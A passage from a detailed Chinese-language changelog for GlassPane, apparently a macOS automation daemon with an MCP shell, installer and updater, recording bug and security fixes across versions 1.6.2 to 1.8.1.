环境预检拒绝），所以那份字节不该进 registry。tag 与 Release 已经对外且**不可由本任务删除**
（删 Release / 移动已推送的 tag 属 owner 动作），处理方式只有两条，这里选的是第二条：

- 不要动 `v1.8.0`：它对外有效，归档、SHA256SUMS 与两份 `.asc` 都签名可验，只是它的
  `glasspane-install` 带着那半条未修完的缺陷；
- 把修完的内容发成 `1.8.1`，npm 只发 `1.8.1`，于是 registry 上从来没有过 1.8.0。
  按 tag 装 1.8.0 的人，下一次自动更新会直接走到 1.8.1（更新器比的是版本，不是 tag 名）。

### Fixed

- **安装器入口的五条退出全部交给事件循环**：上一笔只把 `install` 的 `.catch` 改成了
  `process.exitCode`，参数错误／`--help`／`--restore-launchd`／环境预检拒绝四条仍留着
  `process.exit()`——`curl | sh` 的 stdout 是管道，抢在 flush 之前退会把刚写出去的
  usage、预检清单、恢复判定句连根截掉，而那正是失败时唯一可读的一段。
- **两条把"本机有什么"当前提的测试重写**：端到端那条指望走 install 的拒绝分支，而 Linux
  runner 没有 swift，必然先被环境预检挡住（本机绿、CI 红）；机制那条断言 `exit()` 必丢字节，
  实测在 runner 上两种写法都交回全部 204,806 字节。重写后：形状层静态核"入口无
  `process.exit(`"（跨平台、恒可红），端到端用三条任何平台都走得到的拒绝路径核"退出码对、
  已写出的字节一个不少"，真安装失败那条按 `swift` 在场与否声明跳过并写明原因。
  反向验红：入口任意一条改回 `process.exit(2)` → 形状层具名用例红；恢复后 6/6 绿。
  完整记录与因果在 1.8.0 条目"安装器"那一节的第四条 bullet。

## [1.8.0] — 2026-10-06

版本判断：**按 minor 记**。判据仍是 1.6.2 条目里本仓自己写下的那一条——patch 要求「状态文件的字段
没动、退出码集合没动、CLI 参数没动、npm 包的 `bin` 声明没动」。这四样本版确实都没动（daemon 的开关
表实测仍是 30 条，退出码集合仍是 `{0,1,2,3,64,65}`，两个包的 `bin` 声明没改，状态文件字段没动），
但本版**动了两处对外可见的契约内容**，所以不走 patch：

- daemon 在 `hello` 里自报的 `capabilities` 从一份手抄清单改成由线协议方法表推导。手抄那份已经与
  `FrameCodec` 的 `EngineMethod` 互不相认：报着线上根本不存在的 `probe`，又漏掉 `attach`、
  `last_evidence`、`probe_status`。仓内没有任何读者会因此报错（实测：`mcp-shell/src` 里唯一的
  `capabilities` 是 MCP 自己的 `tools` 声明），所以漂移是静默的——也正因为它没人读，改它不影响任何
  现有消费者，但它仍然是对外协议上的一句自述，不该塞进一个 patch 里悄悄发出去。
- MCP 壳新增一个**只属于壳的**错误码 `GP_E_ENGINE_BACKLOG`（`kernel/schemas/**` 里一个 `GP_E_*`
  都没有，实测 `grep -c` = 0，因此不构成 schema 变更）。旧行为是拿
  `GP_E_ENGINE_UNREACHABLE` 回答一件它自己解释不了的事，见下。

本版**没有**合并未发布的版本号：1.7.0 的 tag、GitHub Release 与 npm 两个包本轮实测对齐
（`npm view glasspane-mcp version` = `npm view glasspane-install version` = 1.7.0；
`gh release view v1.7.0` 回 `isDraft=false`、target=`acfdbeb…`、4 件资产齐全）。
全部改动向后兼容：没有删除或改变任何既有开关、字段、退出码或工具的形状。

### Fixed — 四道「守着守着，其实自己看不见自己」的守卫

- **`check-workflows.mjs` 每两行只看一行。** `RUN_SCRIPT` 带着 `g` 却从不重置 `lastIndex`，
  而调用方对每一行只做一次 `exec()`。实测输入 `["npm run build","npm run bundle …","npm run test …",
  "npm run build"]` 的逐行结果是 `["build", null, "test", null]`——**跳过的正好是偶数行**。
  后果：ci.yml:86 与 release.yml:92 的 `npm run bundle` 从来没被核过，把那个 script 改名，守卫照报
  clean。现在每行扫到没有匹配为止，`--self-test` 从 5 例加到 6 例（新例专门盯这个共享 `lastIndex`
  的缺陷），并补了 `--workspace` 归属解析——漏检被修掉的当场就把 release.yml 那条
  `npm run bundle --workspace glasspane-mcp` 顶了出来，逼着这道闸学会"名字在哪个 package.json 里"。
- **CI 的发布形态守卫会测错东西。** `PKG=$(npm pack --silent | tail -1)` 跑在默认 `bash -e`
  （无 `pipefail`）里：pack 失败就是 `PKG=""`，下一行 `npm install "$GITHUB_WORKSPACE/mcp-shell/"`
  装的是**源码目录**，于是一道本该证明"发出去的包能装上并完成 initialize"的闸，测着一个根本不是发布
  物的东西，还能打出 OK。现在这个 step 显式 `set -euo pipefail` 并要求 `$PKG` 非空、文件存在、
  形状是 `.tgz`。反向验过：把旧的 step 正文拿去跑同一条被破坏的 `npm pack`，旧版 exit 0，
  新版三条形状各自 exit 1。
- **`updater` 的陌生状态根闸门只认第一个 `--state-dir`。** `stateDirReadings` 自己的注释写着"多于一个
  读数就当作判不出来"，可 `decideSwapPermission` 走的是 `stateDirFromArgs`。于是
  `[--state-dir 我们的, --state-dir /other]` 被判成"是我们的根"并放行，换掉的正是别家 daemon 在用的
  bundle。现在两个读数一起看，读不出唯一根就拒，且拒得有名有姓。
- **`npm-publish` 作业不核对"发的是不是被 tag 的那棵树"。** 提示词与 `tools/prompts` 都写着 dispatch
  必须显式带 `--ref v<X.Y.Z>`，可这件事一直只靠纪律：忘了带，`actions/checkout` 就落到默认分支 HEAD，
  `check-version` 还拿 main 的版本线自证，registry 收到一份与任何 tag 都不对应的字节——而 npm 发布
  不可逆。现在这一步前面多了一道显式拒绝：`github.ref` 必须是 `refs/tags/v<版本>`、远端确有该 tag、
  它 peel 出来的 sha 等于 HEAD、两个包的 `version` 等于 tag，`mode` 空值也不许落进 publish 分支。

### Fixed — 拒绝语把自己指回一条走不通的路

- **背压闸的出路是不可执行的，并且替一次内存测量批准了重启。** daemon 停止读 socket 时，壳拒绝新调用，
  remedy 却写着"先用 `gp_probe_status` 查一下"——那本身要再过一次同一个 `call()`，被同一个闸原地拒掉，
  于是这条建议在对方不读 socket 的整个期间**永远做不到**；接着它点名"用 `glasspaned --help` 里的命令重启
  （或面板的重启按钮）"，而本文件 `livenessProbeDecision` 的规矩是只有 `unreachable` 才准点名生命周期
  动作——这里唯一测到的是**本进程**的字节水位，一个正在 `act` 的 daemon 与一个卡死的 daemon 在这个读数
  上一模一样，SIGTERM 下去毁的是用户屏幕上的在飞动作。现在它有独立的码
  （`GP_E_ENGINE_BACKLOG`），出路只剩三件真做得到的事：停止发送、等队列排空、读 daemon 自己的日志
  （点名 `~/.glasspane/installer-daemon.log`）。旧文案里"每次重试都只会把队列堆得更深"也是错的——
  拒绝发生在 `writeLine` **之前**，一次被拒的调用一个字节都不写；改成了实话。
- **`needs-consent` 的第三道门只说"你手工做"**，不给命令。同处的 `major` 与 `unsigned-release` 两道
  都写得出 `--consent <kind>`，而 `--consent state-dir` 是真接了线的选项（`cli.js` 解析、`policy.js`
  兑现）。一句没有动作的拒绝，代理无从操作。现在它给出完整的 `updater apply --state-dir … --consent state-dir`。

### Fixed — 面板说了一句它没测过的话

- **归因卡在没人看守这个窗口的时候宣称"期间检测到本人操作"。** `EngineCore` 在无监视时把
  `contaminated` 按保守判 true——那是"缺一次观测"这个事实，不是一次观测。面板把结论当测量印了出来，
  判净的一侧同样不诚实（无人看守时的 false 出自声明）。现在两侧都按"这个窗口到底被看守过没有"分叉，
  依据是 daemon 自己写进 `circuitBreaker.reason` 的那两个标签（`input-contamination-not-monitored` /
  `-monitor-lost`），冻结 schema 里没有 monitor 字段，这是唯一还活着的记录。
- **一次性 CLI 的 stderr 被丢掉。** `ConsoleModel` 建了 `standardError = Pipe()` 却从不读它，而 daemon
  把 `--project-prune` / `--project-remove` 的每一条拒绝**只**写到 stderr。于是面板对着一个读不开的
  `projects.json` 报"后台服务不认得 `--project-prune`"——数据受损Adjacent 的路径上给用户一句错的诊断。
  现在 stdout/stderr 一起交回，且只在"形状没读出来"时把 daemon 的原话附上。
- **第一帧 `hello` 回来之前，权限卡就敢写"未请求"。** 初始化态是 `.notDetermined`，面板于是替一个还没
  问过的 daemon 报了 TCC 三态里的第三态——包括那张按设计必须恒"未验证"的开发者工具卡。现在初始化成
  无报告态并注明尚未取自报。

### Fixed — 崩溃、卡死与不受界的内存

- **目标进程回一个不是 AXValue 的几何值时，daemon 不是降级而是当场 trap**（服务线程上、一次 act 中间）。
  订正一处：`as! AXValue?` 在 `CFTypeRef → 具体 CF 类`这条路上**不做任何运行时检查**，所以那句既不会崩
  也什么都没验，下一行"不是 AXValue"的专用原因永远读不到，一个 CFString 会被报成"点/尺寸解不出来"。
  现在按 `CFGetTypeID(...)` 判，并把这段抽成不碰 `AXUIElement` 的纯函数以便验红。
- **超大帧期间，60 秒的部分行超时永不上膛。** `SocketServer` 用 `codec.pendingBytes > 0` 决定要不要上膛，
  而 codec 进入 `discardUntilNewline` 时 buffer 是空的——客户端写完 4 MiB 后停住，daemon 就永久阻塞在
  `read()` 上，而这个 daemon 一次只服务一个连接，别的客户端从此全被锁在外面。现在"行未结束"与"正在丢弃"
  两种状态都上膛。
- **探针 SDK 的读侧没有帧上限**（daemon 那一侧有 4 MiB 的闸），一条不结束的帧会在被测应用里无限增长。
- **下载器只在整个 body 缓冲完之后才比长度。** 一个只发不结束的流因此可以在 45 分钟的天花板里把每日
  定时任务的内存吃光。现在长度比对搬进读循环：声明过长立刻停，什么都没声明则按 256 MiB 的固定上限夹住
  （真机 v1.5.1 的 tar 资产是 25,126,902 字节，十倍余量）。上限必须由"实际被读走了多少字节"证明，
  否则一条永远读不完的夹具只会让测试挂住而不是让拒绝变红——这条是本轮实测出来的。
- **`check` 之后被改写的暂存发布物，`apply` 仍照旧构建并安装。** `apply` 只问"这棵树在不在、形状对不对"，
  `state.staged.digest` 那个数字一直现成着，只是没人拿它重新测——于是同用户任意进程往暂存目录里写一个
  文件，它自己的源码就会被编译进 daemon 那份二进制，由 launchd 带着辅助功能与录屏席位启动。现在 apply
  在任何构建/打包/替换之前重新量一遍：摘要不对、树与归档里的树对不上（点名是哪个文件）、归档不见了，
  各自拒，且一样都不做。

### Fixed — 发布物与版本线

- **`set-version.mjs` 的回滚快照漏了时序。** lockfile 是在 `npm install --package-lock-only` **跑完之后**
  才纳入快照的，于是靠后的目录失败时，回滚把 10 个声明位点退回旧版本，而已经重生成的 lock 停在快照里那份
  新版本上——正是本脚本开头写着"绝不留"的那个"部分统一"。现在快照在重生成之前取，重生成期间新出现的
  lock 在回滚时被删除。顺带修 `--no-lock`：它此前必然回滚（自证那一步仍把 lock 算作漂移），等于对外
  advertise 了一个做不到的开关。
- **两个版本线位点根本没人核。** `mcp-shell/package-lock.json` 的 `"../kernel"` 与根 lock 的
  `packages["updater"]` 都带着 `version` 字段而不在 `LOCKFILES` 表内。补进表内之前先用真 npm 11.17.0
  在 scratch 副本上验过这两个字段确实由 `npm install --package-lock-only` 维护（各自只动那一行）——
  不然这道闸会 permanently 红，那是另一种没交付。同时否掉一条评审结论：根 lock 的
  `node_modules/glasspane-update` 是 `{"resolved":"updater","link":true}`，**没有** version 字段，
  不是漏检位点，这条已由测试钉住以免再被"修"一遍。
- **发布归档里带着 `.iterate_decisions.md`。** 排除表此前只有 `harness/`，而这份开发者自己的迭代日志
  在 v1.7.0 的归档里含有 4 处作者绝对 home 路径与 `gh auth` token 口径的笔记。仓库本身是 public，
  所以问题不在"文件存在"，而在"每一个 updater 都会下载的那份产物把构建它的人是谁带了出去"。
  更新路径上一行都不读它，因此排除它的代价是零——这一点由 `REQUIRED_IN_ARCHIVE` 反向闸保证不会被
  排除掉安装输入。
- **SECURITY.md 的一句安全主张指不到代码。** 它写着 `gp_export_evidence` / `gp_recent_reports` 的报告
  "写到调用方指定的路径"。实测那个工具的 `inputSchema` 只有 `{operationId, format}`（另有
  `additionalProperties: false`）——**根本没有路径参数**，报告是以工具结果文本回给代理的。双语两侧
  都改成代码真正做的事，并把真正的暴露面写清楚：屏幕上的界面文本进的是代理会话与模型提供方留存，
  而不是磁盘上那个没人写过的文件。

### Fixed — 安装器

- **`--restore-launchd` 每次都把健康的作业重启一遍。** `launchdNeedsReregister` 比的是"已加载作业
  定义的 program 路径"与"本次要装的路径"，而 `desiredProgram` 缺失时那句比较的对象是 `''`——恒为
  "要重注册"。`--restore-launchd` 恰恰是不传这个值的那个调用方，而它正是 daemon 不可达时安装器交给
  代理执行的那条命令：一次"恢复"于是 bootout + bootstrap 一个**健康**的作业，杀掉任何在飞的 act，
  并把 `boot.already` 那支快路径变成永远走不到。现在调用方没给时，`launchctlBootstrap` 自己从本次
  的 plist 读回要装的程序路径；plist 读不回来时按保守方向走（宁可重注册，不假装一致）。
- **bootout 失败被读成"注册成功"。** 定义确实变了时要先 bootout 旧作业，而那句 `spawnSync` 的退出
  状态从来没被检查；bootout 失败后 bootstrap 回 status 5 / "already loaded"，下一段把它映射成
  `ok: true`——安装器打印"开机自启已注册"，launchd 却还在起**旧**程序，正是这段代码注释里说本设计
  已经修掉的那个 EX_CONFIG 陷阱。现在 bootout 失败即拒，且 bootout 失败与 bootstrap 失败分开报，
  代理拿到的下一步不会是一条错的命令。
- **状态目录 0755、守护进程日志 0644，且"请求了 mode"被当成"贴上了 mode"。** `ensureLogDir` 建
  目录时不带 mode，日志以 `openSync(path,'a')` 创建，而 daemon 启动时那次收紧遍历管 registry、
  approvals、evidence，唯独不管这份日志（`SECURITY.md` 早已把这两个数字作为**实测**记在案，是
  "已记录未修"）。现在目录按 0700、日志按 0600 请求，并核验落盘后的实际 mode——mode 没贴上去就是
  写失败，不是"警告一下继续"。
- **失败路径 `process.exit(1)` 截断它自己要给人看的那几行。** 文档里的调用形态是 `curl | sh`，
  stdout 是管道；stderr 写完就 exit 会把还在队列上的步骤输出截掉。成功路径早就改用
  `process.exitCode`，失败路径这次对齐。
  **这条第一次只修了五条退出里的一条**，是 Linux CI 把它揪出来的：那台 runner 没有 swift，
  环境预检拒绝必然走到，而当时的端到端测试指望的是 install 的拒绝分支——于是一句
  "必须走的是 install 的拒绝分支"在 mac 上绿、在 CI 上红，顺带暴露了参数错误／`--help`／
  `--restore-launchd`／环境预检这四条出口仍然在用 `process.exit()`。现在入口那一段一条
  `process.exit(` 都不留（静态、跨平台、每个 CI 都跑的形状闸），端到端改成三条在任何平台
  都走得到的拒绝路径（含把 PATH 抽干净**主动**逼出预检拒绝，而不是等本机恰好缺 swift），
  真安装失败那一条按 `swift` 是否在场声明跳过并写明原因。机制层那条"exit() 到底丢不丢字节"
  改为**实测**：本机量得到就断言，量不到（Linux runner 上两条都交回全部 204,806 字节）就
  如实声明不可观测并跳过——它从来不是产品闸，产品闸是形状与端到端那两层。

### Fixed — daemon 的 CLI 诚实性

- **`--prune-evidence` 在归档读不了的时候报 `{"pruned":0}` + exit 0。** `prune`/`countExpired` 把
  `.unreadable` 折成空列表，删除这条路于是把"什么都没数出来"打印成"没有需要删的"。`--evidence-stats`
  为同一件事挨过批评（R6-08）并已经改对了，删除侧这次跟上：读不了就发 `"pruned": null` 并带
  `listFailure` 原话，退出码集合不变。实测过真进程两种真实成因（`evidence` 被换成普通文件 →
  `Not a directory`；目录 000 → `Permission denied`）都回 null，而可正常列举的对照仍回数字；
  把接线退回旧写法，同一夹具立刻回 `"pruned":0`。

### Added

- **`GP_E_ENGINE_BACKLOG`**：见上。壳侧码，不是 daemon 码；`remedy-surface` 那道闸把它归进
  "shell-only"，并钉住它的 remedy 里既不许出现探针调用、也不许出现 `livenessProbeDecision` 那套
  生命周期命令。

### Internal

- 门禁收口实测（基线 → 本版）：`swift test --package-path engine` 768 → **798 执行 / 3 跳过
  （按设计的真机 opt-in，不许为了让它变绿而删断言）/ 0 失败**；`engine/probe` 24 → 24 / 0 失败；
  根 `npm test --workspaces --if-present` 的 ✔ 行 960 → **1011 / 0 ✘**，按 workspace 分：
  kernel 90、glasspane-mcp 407 → **408**、glasspane-install 92 → **110**、
  glasspane-update 392 → **403**，各自 0 失败；`pytest -q bridge` 58 通过；`check-doc-links`
  仍是 24 份文档 / 223 条仓库内链接 / 26 条外链；`check-workflows --self-test` 5 → **6 例各自验红**；
  发布形态 `npm pack` 仍是 22 个文件，178.5 kB → 180.4 kB（unpacked 609.7 kB）。
- **本版新增测试的形状值得说一句**：几条关键拒绝是靠真进程 / 真字节证的，不是桩——
  `--prune-evidence` 用真 `glasspaned` 二进制对着"evidence 被换成普通文件"（`Not a directory`）与
  "目录 000"（`Permission denied`）两种真实成因各跑一次，并用可读的对照保证它不是恒 null；
  `verifyStagedBytes` 用 `packTarGz` 产出的真归档与真解出来的树跑；CI 那两条守卫的 step 正文是从
  工作流文件里逐字抽出来、对着被破坏的 `npm pack` 跑的。
- 面 A 棘轮因本轮背压闸与 remedy 闸的有意增长而补记基线：`mcp-shell/src` 8554 → **8601 LOC**
  （`engine-client.ts` +24、`errors.ts` +15、`http-gateway.ts` +8），单独一条 `chore(harness)` 提交，
  金样与代码同批。口径不变：面 A 仍超文档的 10% 上限（23.48% → 23.39%），那是"上限定得早于测量"
  的既有事实，棘轮只负责让它不再继续长。面 B（fork 侧）5056 LOC 未动，`harness/tools` 一行未改。
- `tools/prompts/daily-glasspane-main.md` 的端到端那一步订正：它此前写着
  `GLASSPANE_STATE_DIR=<临时目录> glasspaned --permissions`，而 daemon 实测**不读**这个环境变量——
  它打一句"home default"警告后照旧在 `~/.glasspane` 上执行。同一条命令换成 `--prune-evidence`
  就是在真机上删真档案（事后核对 `~/.glasspane/evidence` 582 条 / 934,255 字节完好——本版默认 TTL
  下没有过期项，但这不是可以再来一次的操作）。改为要求 `--state-dir`，并记下"归档条目都在单一
  顶层目录 `GlassPane-<ver>/` 下，锚在 `^harness/` 的检查会空过成绿"这条实测坑。
- 本轮有两条评审结论经实测**不成立**，记下来免得下一轮再"修"一遍：`glasspaned main.swift` 那句
  `bundleId` 并不是塞进 `[String: Any]` 的 `Optional`（同段里可选的是 `evidenceStoragePath`，它已经
  `?? NSNull()`）；"release.yml 从不签 tag，所以安装器的发布 tag 验签永远不可能通过"也不成立——
  本机 `tag.gpgsign=true`，`git tag -v v1.7.0` 实测回"完好的签名"，密钥与归档 `.asc` 同一把
  （`0929EA31DF4F7429F63FC53189D88B1D043A1298`）：签 tag 的是发布的人，不是 CI。

## [1.7.0] — 2026-10-04

版本判断：**按 minor 记**。判据沿用本仓自己在 1.6.2 条目里写下的那一条——patch 要求
「状态文件的字段没动、退出码集合没动、CLI 参数没动、npm 包的 `bin` 声明没动」。这一版
**动了 CLI 参数**：daemon 新增 `--project-prune` 与 `--project-remove`；也新增了用户可见的
控制件（面板的「信任这个发布并重新检查」按钮、各页卡片的折叠）。所以它不是 patch。
全部改动向后兼容：没有删除、改名或改变任何既有开关、字段、退出码或工具的形状。

本条**合并了尚未发布的 1.6.3**（那一版从未打过 tag，npm 停在 1.6.2）。1.6.3 原条目自称
「GlassPane 自身零产品代码改动」——那句话对它写下时的那一刻是准确的，但 1.6.3 一直没发，
其间主干进了大量产品代码，所以继续沿用就会让一份发布说明声称它没碰过的东西没被碰过。
下面「harness」那一节是 1.6.3 原有的内容，其余是新增的产品侧改动。

harness 现在在主仓维护（与 iterate 生态一致），不再是某个 worktree 的私有财产。

### Added — 面板可以调节了

- **卡片能单独收起**：更新页 3 张信息卡、证据详情的 11 类通道卡、权限页的后台服务卡与
  4 张权限说明区、项目页的路径卡、台账的每一条记录。折叠状态按稳定 key 记在本机设置里，
  面板重开不重置人自己收拾好的版面。**折叠后结论仍在标题行**（"结构未见变化 / 变化 0.0000% /
  已备好 / 未测量 / 已配 2／3 条路径"）——收起一张卡不该把它说的事一起收掉，那只是把信息
  换成"要点开才知道"。卡片上的动作（刷新、验证、访达打开、复制项目 ID）留在折叠按钮**外面**，
  收起不等于停用。
- **正文列跟着窗口长**（原先每一页各自写死 760pt，窗口拉大只长出死白）。

### Fixed — 面板

- **更新页把 `needs-consent` 的三道门并成一道，「安装更新」从此永久按不动**，而禁用理由让用户
  去点「立即检查」——不带确认的检查只会原样再拒一次。真机上这台机器连着三条
  `check → needs-consent / signature-tool-missing` 就是这个死循环。现在按更新器写的 `code` 认门，
  各给各的动作：跨大版本 `apply --consent major`；作者身份缺口给新按钮
  「信任这个发布并重新检查」（`check --consent unsigned-release`，因为那一次检查在下载前就停了，
  盘上根本没有可装的版本）；面板无权代签的那一道只把门说出来，不再把人绕回原地。
- **成功被渲染成故障**：`.staged` / `.available` 回的那句好消息原先进了带告警图标的红色失败卡。
- **趋势统计卡没有高度上限也没有分隔线**，档案一多它自己要八百多点高，把证据列表整个挤出窗口
  （实测列表滚动区在 y=797、窗口下沿在 y=760，一条都看不见）。现在两者之间是一条可拖的分隔线，
  卡内自己滚。
- **详情栏把内容的理想尺寸当最小尺寸交给分栏**，切到证据/审批页时左侧导航整条被裁出窗口
  （"首次使用"只剩"使用"、图标全不见）。
- **状态标签放不下时被整枚裁掉**（不是压缩，是消失）——标签是颜色之外的第二种状态表达，
  "降级 3"被裁掉就等于读成"没有降级"。改成会换行的排布，并把换行算法抽成纯函数以便验红。
- **图标按钮的命中区小到点不中**：侧栏"全部重测" 9×10pt、各处复制按钮 10×12pt，一律撑到 20×20。
- **配方页把中文写进无障碍标识**（自动化按标识选不中元素，这一仓自己的规矩），以及那枚写着
  "刷新"、实际只做"清除上一次校验结论"的按钮——改名为它真正做的事。
- 若干被中段裁成 `INCONCLU…` / `dae…tats` 的关键文字（"这一栏的数字从哪来"正是最需要读清的一句）。

### Added — daemon

- **`glasspaned --project-prune [--dry-run]` 与 `--project-remove <id> [--dry-run]`**。
  这两条命令在 P1 §12.3.1 里早就有完整的字段与退出码契约，面板一直在调，而 daemon 的参数表里
  **根本没有它们**（曾存在于 479a11c，之后被拿掉）。实测 `unknown argument` + 退出码 64。
  现在按 §12.3.1 落地：残留判据只有一份（与面板预览表同一个函数）、`pruned` 是"写成功且读回
  确认已消失"的条数而不是命中数、两条都认 `--dry-run`、读不回的文件拒绝覆写。

### Fixed — daemon

- **`GP_E_PROJECT_LIMIT` 的出路命令一件都做不动**：原文让人"先删除没用到的项目
  （`glasspaned --list-projects`）"，而这一面没有任何删除动作、`--list-projects` 只打印。
  壳侧早已被改成实话并有闸钉住，daemon 这一份没人管——而 `engine-client.ts` 是把 daemon 的
  remedy 逐字转达的，同一个错误码于是从两层得到两句相反的话，恰好是 daemon 那句在命令人做不存在的事。

### Fixed — MCP 壳：四处「看起来在证明什么，其实什么都没证明」

- **引擎回的一帧既无 `result` 也无 `error` 被当成成功**。代理实际收到
  `{"content":[{"type":"text"}],"isError":false}`——引擎什么都没答，读到的是绿。
  现在按 `"result" in frame` 判："没这个键"与"键是 undefined"不是一件事。
- **合法 JSON 但不是一帧的东西把壳进程打死**：`handleMessage` 的 try/catch 只包住 `JSON.parse`，
  而 `null` 解析得过、下一行读 `frame.id` 就在 socket 的 `data` 回调里抛出去——`index.ts` 没有
  `uncaughtException`，整个壳退出，所有在途请求一起消失。stdio 那一侧早就挡了这个形状。
- **打错的开关被静默丢掉**：`--socket-pth /tmp/x` 照样启动并连到它自己猜的默认根，而操作者以为
  点名了另一个 daemon——连错 daemon 意味着 act 落在别的 app、别的机器上。
- **`autoUpdate=on-by-default` 是从"两个字段都没记着"里编出来的正面主张**，与本文件开头给自己立的
  规矩相反；同处 `lastError` 只有 code 没有 message 时整条被丢，把唯一还能核对的事实扔了。
- **证据报告把 app 自己写的字符串原样送上终端**：`escapeHTML` 只护住 HTML 那半，而
  `gp_export_evidence` 默认交回的是 markdown——窗口标题里一段 OSC-52 就能改写用户剪贴板。
  daemon 那一侧为这件事立过规矩（R5-03），壳这一侧补齐。
- **`gp_project_set` 的读—改—写会把别人的写静默盖掉，却报告成功**：tmp+rename 只挡住"读到写坏的
  一半"，挡不住"两次完整的写互相覆盖"，而这份表有三个进程会重写。现在写之前核对文件身份，
  变了就拒绝并给出可执行的下一步。

### Added — 一道本来就该有的闸

- **`PanelDaemonCommandContractTests`**：把面板实际发出的 daemon 开关与 daemon 真正解析的开关
  对照在一起。这两个包各自都有测试——面板测消息折算、daemon 测自己解析的那些——
  **谁都没看过对方**，所以"清理按钮按下去什么都不删还报平安"能一直活着。缺的从来不是
  测试覆盖率，是有人把两张表放在一起。

### Fixed — harness 棘轮的两处使用失误

- `tool-surface` 报的 `+55` / `+44` 是本轮自己碰出来的：金样 record 早于代码一步，顺序反了。
  按这道闸自己的话补记（金样与代码同批），口径不变——面 A 仍超文档的 10% 上限，
  那是"上限定得早于测量"的既有事实，棘轮只负责让它不再继续长。
- 引擎 socket 的背压：daemon 停止读时 `writeLine` 不看 `write()` 返回值，Node 会把帧无上限地
  堆在本进程内存里。现在超过 8 MiB 就拒收新调用，并说清"这是卡死不是忙"。

### Fixed — 三件「不可让步的纪律」其实是散文

- **尺子层根本不在主干上。** `harness/tools`（6 把闸门）与 `harness/contracts`（5 份金样）此前只存在于
  一个 worktree 的分支里，不在 `main` 的版本控制内。而 `FORK.md` 把「分叉必须可测量」列为不可让步
  纪律并给出 4 条命令——其中 3 条在 `main` 上是 `MODULE_NOT_FOUND`，主干 CI 里 `grep -c harness`
  当时是 0。**两个月里没有任何东西发现**，发现它的是发布出去的安装器被人用坏，不是任何一道闸。
- **vendored 内核从未被排除在工具面之外。** 两处静默失效叠加：排除规则读一个不存在的路径，
  清单里的 `forkPath` 又是重复拼出来的。1464 行 kernel 字节一直被算成「我们写的代码」。
- **GitHub release 兜底安装从未成功过，且不验签。** 安装器请求 `<product>-<platform>-<version>.tar.gz`，
  而发布链上传的是 `<product>-<os>-<arch>.zip`（文件名里没有版本号，且只有 Linux 目标才打 tar.gz）；
  实测 v0.6.3 / v0.5.1 / v0.4.0 全部 404。而 0.6.3 随包发出的安装器里 sha256 / gpg / asc 一个都没有——
  发布链给每个资产签了 `.asc`、发了 `SHA256SUMS.txt`，收到它们的安装器从不读。

### Fixed — CI 里两件「看起来在证明什么、其实什么都没证明」的事

- **`harness-contract.yml` 是一份 GitHub 拒绝解析的工作流**：某个 step 名里有 `: `，YAML 读成嵌套
  mapping，整份文件在解析期作废，每次触发只留一个 0 步、无日志的红灯。而体检脚本
  `check-workflows.mjs` 对它报 "clean"——它读 job 名与被引用脚本，从不问 YAML 能不能解析。
  现在补了规则（未加引号的 `: ` / `?`），反向因果已验。
- **`check-workflows.mjs --self-test` 此前根本不存在**：脚本完全忽略 argv，CI 里那步一直在跑普通检查
  然后 exit 0，未知参数同样静默通过。现在它用变异法逐条验每条规则都会红（5 例），未知参数 exit 2。

### Fixed — 三道闸在合并后红了，逐条查证后重记

`fork-diff`（9 条过期项，先逐文件确认与已发布的 0.6.3 逐字节一致）、`brand-surface`（+1 定位到一处
**注释**，同一提交把用户可见的 `opencode -s <id>` 修成了 `glasspane-harness -s <id>`）、
`tool-surface`（面 A 是主干上真实的 1.6.x 产品代码；面 B 是尺子第一次在有上游参照检出时正确归属我们
自己的 `gp_*` 工具面）。`surface-semantics` 同批仍 **0 hit**——判定全部留在 Swift 引擎里，
这才是这套棘轮真正要守的不变量。

### Added

- **`harness-rulers` 成为主干 CI 的一条 lane**：每次 push 先断言 6 把尺子与 5 份金样在树里
  （就是这次的回归形态），再逐道跑；上游参照检出按 pinned tag `--depth 1` 拉取并核对 tag 本身。

### Internal

- `FORK.md` 新增第 3 条纪律「尺子必须和 fork 同仓」，并说明 `subtree split` 只带走
  `harness/glasspane-harness/` 是对的：尺子量的是主仓里这棵树，不随产品分发。
- 修掉 `tool-surface` 在无参照检出时把「被编辑的测试文件」当成量不出来而中止；`product-surface` 的
  installer dry-run 改为按平台各断言各自**有文档的行为**（macOS 出计划，其他平台必须说出
  macOS-only 并点名产品），而不是在 Linux 上把正确的拒绝当成失败。
- 修掉 `build.ts` 的 `product` 注解缺 `name`——它让 split 仓自己的 typecheck 从 0.6.3 起一直红。

## [1.6.2] — 2026-10-03

版本判断：四笔全是修复——状态文件的字段没动、退出码集合没动、CLI 参数没动、npm 包的 `bin` 声明没动。
发布**归档的内容**变了（不再带 `harness/`），但那是产物体量与组成的收敛，不是消费端要适配的形状，
所以记 **patch**。⚠ 有一点必须说：这一版的修复对**已经在跑 1.6.0/1.6.1 的机器**只生效一半——
那两份代码里的速率下限还是写死的 16 KiB/s，所以从 2.1 MiB 归档里受益要等这次换版成功之后；
慢链路上第一次升级仍可能要人点一次"安装更新"。

### Fixed — 发布归档把 90% 的体量花在没人读的那份 fork 上

真机跑 1.6.1 换版时撞上的：`updater check` 收到 348 KiB 就把这次发布拒了，句子说"7.3 KiB/s 太慢"。
量出来两件事叠在一起。**其一，归档太大了**：`GlassPane-1.6.1.tar.gz` 25,534,048 字节，而本仓 tracked 的
60.8 MiB 里 **54.7 MiB 是 `harness/`**（5,356 个文件里的 5,032 个）——那是 vendored 的 opencode fork，
换版路径一行都不读它（`apply` 只读 `engine/`、`mcp-shell/`、`installer/`、`updater/`）。现在
`scripts/make-release-archive.mjs` 按 `EXCLUDED_PREFIXES` 把它留在档外，并新增 `REQUIRED_IN_ARCHIVE`
那道拒绝：**排除规则碰到安装路径要读的任何一条就拒绝发布**，`--verify` 也逐条要求它们在场——否则
"把 `engine/` 一起排掉"会产出一个每个 `bin` 字段都满足、却根本装不出来的归档。打印的行里带上被排除的条数
与原始字节数，变小这件事必须看得见。

### Fixed — 速率下限绑在一个 payload 尺寸上，归档一变小就误拒

`minRateBps` 原先是写死的 16 KiB/s。那个数字不是"选出来的"，它是 24 MiB / 25min 的解被抄进代码——所以
归档瘦到 345 条目 / 2.1 MiB 量级（v1.6.1 发布件是 25,534,048 字节 / 5,377 条目）之后，同一条常数会拒掉
**五分钟就能下完**的下载（本机 2026-10-03 实测就是被它拦在
348 KiB，这台机器因此停在 1.6.0）。现在下限由 `rateFloorFor({ declared, budgetMs })` 反解：
`max(1 KiB/s, declared / 25min)`，25min 是"一次下载最多占住这条每日作业"的预算，句子也把下限是从
